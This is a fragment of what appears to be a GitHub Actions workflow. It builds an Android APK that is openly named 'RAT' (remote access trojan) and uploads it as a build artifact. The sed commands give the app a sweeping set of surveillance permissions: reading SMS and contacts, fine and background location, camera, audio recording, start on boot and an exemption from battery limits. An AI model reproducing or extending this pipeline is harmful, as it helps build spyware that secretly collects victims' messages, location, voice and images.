    - name: Create spec
      run: |
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = RAT/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.rat/g' buildozer.spec
        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,READ_PHONE_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,READ_LOGS,WAKE_LOCK,SYSTEM_ALERT_WINDOW,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,RECEIVE_BOOT_COMPLETED,CAMERA,RECORD_AUDIO,ACCESS_BACKGROUND_LOCATION/g' buildozer.spec
    - name: Build
      run: buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: RAT
        path: bin/*.apk
